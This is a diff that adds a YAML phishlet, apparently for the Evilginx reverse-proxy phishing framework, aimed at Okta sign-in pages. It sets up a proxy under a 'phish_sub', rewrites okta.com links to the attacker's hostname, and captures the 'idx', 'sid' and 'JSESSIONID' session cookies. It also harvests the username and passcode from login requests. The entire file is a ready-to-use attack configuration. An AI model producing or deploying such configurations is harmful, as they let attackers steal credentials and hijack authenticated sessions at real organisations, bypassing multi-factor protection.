@@ -1,0 +1,44 @@
+name: 'Okta'
+author: 'By LxKh4n1yn-Kali-LinuX'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - phish_sub: 'mycompany'
+    orig_sub: 'mycompany'
+    domain: 'okta.com'
+    session: true
+    is_landing: true
+    auto_filter: true
+
+sub_filters:
+  - triggers_on: 'mycompany.okta.com'
+    orig_sub: 'mycompany'
+    domain: 'okta.com'
+    search: 'mycompany.okta.com'
+    replace: '{hostname}'
+    mimes: ['text/html', 'application/json', 'application/javascript', 'application/ion+json']
+  - triggers_on: 'mycompany.okta.com'
+    orig_sub: 'mycompany'
+    domain: 'okta.com'
+    search: 'https://.*.okta.com'
+    replace: 'https://{hostname}'
+    mimes: ['text/html', 'application/json', 'application/javascript']
+
+auth_tokens:
+  - domain: 'okta.com'
+    keys: ['idx', 'sid', 'JSESSIONID']
+
+credentials:
+  username:
+    key: 'identifier'
+    search: '(.*)'
+    type: 'json'
+  password:
+    key: 'passcode'
+    search: '(.*)'
+    type: 'json'
+
+login:
+  domain: 'mycompany.okta.com'
+  path: '/login/login.htm'
+
